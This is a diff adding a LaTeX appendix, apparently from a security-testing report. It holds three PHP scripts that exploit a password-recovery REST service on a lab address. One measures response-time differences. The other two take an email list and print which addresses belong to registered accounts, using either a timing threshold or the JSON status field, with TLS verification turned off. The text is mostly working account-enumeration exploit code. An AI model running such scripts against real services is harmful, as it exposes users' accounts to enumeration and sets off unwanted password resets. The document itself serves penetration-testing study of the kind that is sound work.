@@ -1,0 +1,138 @@
+\chapter{PHP Scripts for Exploiting Vulnerability OTG-BUSLOGIC-004}
+
+\section{PHP Script  for Calculating the response time average of the password recovery service for valid an invalid response email addresses}
+\label{appendix:average}
+
+
+The script uses the function "curl" to send a POST-Request to the Rest-Service "ForgotPassword". The two parameters of this POST Request are the name of the service and the email address for which an new password should be set. With "$responseTime = curl_getinfo($curl,CURLINFO\_TOTAL\_TIME" we can get the response time for this request. This request are sent 100 times for each a valid and an invalid email address. For each an average is computed an shown in the bash.
+
+\begin{lstlisting}
+<?php
+
+$validResponseTime = 0.0;
+$invalidResponseTime = 0.0;
+for ($i = 1; $i <= 100; $i++) {
+$validResponseTime += responseTimeForRequest("employee@next9.com");
+}
+$validAverage = $validResponseTime/100;
+echo "Average Response Time for valid address: ".$validAverage."\n";
+
+for ($i = 1; $i <= 100; $i++) {
+$invalidResponseTime += responseTimeForRequest("abc@next9.com");
+}
+$invalidAverage = $invalidResponseTime/100;
+echo "Average Response Time for invalid address: ".$invalidAverage."\n";
+
+function responseTimeForRequest($email) {
+$service_url = 'https://192.168.56.101/rest/index';
+$curl = curl_init($service_url);
+$curl_post_data = array(
+'service' => "forgotPassword",
+'email' => $email );
+
+curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
+curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
+curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($curl, CURLOPT_POST, true);
+curl_setopt($curl, CURLOPT_POSTFIELDS, $curl_post_data);
+$curl_response = curl_exec($curl);
+return $responseTime = curl_getinfo($curl,CURLINFO_TOTAL_TIME);
+}
+
+?>
+\end{lstlisting}
+
+\chapter{PHP Script for validating email address via response time}
+\label{appendix:validate_via_time}
+
+This script decides due to the response time of the an request if an email address is belonging to an existing account or not. The response is received like mentioned in the Script above. If the response is bigger than the threshold, it will be handled as valid and printed to the shell.
+\begin{lstlisting}
+	<?php
+	
+	if(!$argv[1])
+	die("Please provide list of email adresses");
+	$emailList = file($argv[1], FILE_IGNORE_NEW_LINES);
+	
+	if(!$argv[2])
+	die("Please provide threshold");
+	
+	$threshold = floatval($argv[2]);
+	
+	echo "Valid Accounts:\n";
+	foreach($emailList as $email)        
+	if (validateEmail($email,$threshold))
+	echo $email."\n";
+	
+	function validateEmail($email,$threshold) {
+	$service_url = 'https://192.168.56.101/rest/index';
+	$curl = curl_init($service_url);
+	$curl_post_data = array(
+	'service' => "forgotPassword",
+	'email' => $email );
+	
+	curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
+	curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
+	curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+	curl_setopt($curl, CURLOPT_POST, true);
+	curl_setopt($curl, CURLOPT_POSTFIELDS, $curl_post_data);
+	$curl_response = curl_exec($curl);
+	$responseTime = curl_getinfo($curl,CURLINFO_TOTAL_TIME);
+	
+	if($responseTime > $threshold)
+	return true;
+	else
+	return false;  
+	}
+	
+	?>
+\end{lstlisting}
+
+\chapter{PHP Scripts for exploiting Vulnerability OTG-IDENT-004}
+\section{PHP Script for validating email address via response of REST Service}
+\label{appendix:validate_via_response}
+
+This Script takes a list of email addresses and prints all of them which are already registered in the system to the shell. To do so it sends a POST Request like the scripts above to the REST Service "forgotPassword". After that it parsed the response, represented by a JSON File. If the field status of this field equals 1, the app generated a new password and sent it via email to the provided address. Else
+the provided email denied.
+\begin{lstlisting}
+<?php
+
+if(!$argv[1])
+die("Please provide list of email adresses");
+$emailList = file($argv[1], FILE_IGNORE_NEW_LINES);
+
+echo "Valid Accounts:\n";
+foreach($emailList as $email)        
+if (validateEmail($email))
+echo $email."\n";
+
+function validateEmail($email) {
+$service_url = 'https://192.168.56.101/rest/index';
+$curl = curl_init($service_url);
+$curl_post_data = array(
+'service' => "forgotPassword",
+'email' => $email );
+
+curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
+curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
+curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($curl, CURLOPT_POST, true);
+curl_setopt($curl, CURLOPT_POSTFIELDS, $curl_post_data);
+$curl_response = curl_exec($curl);
+if ($curl_response === false) {
+$info = curl_getinfo($curl);
+curl_close($curl);
+die('error occured during curl exec. Additioanl info: ' . var_export($info));
+}
+curl_close($curl);
+$decoded = json_decode($curl_response,true);
+if ($decoded['status']['code'] == 1) {
+//die('error occured: ' . $decoded->response->errormessage);
+return true;
+}
+else {
+return false;
+}
+}
+
+?>
+\end{lstlisting}
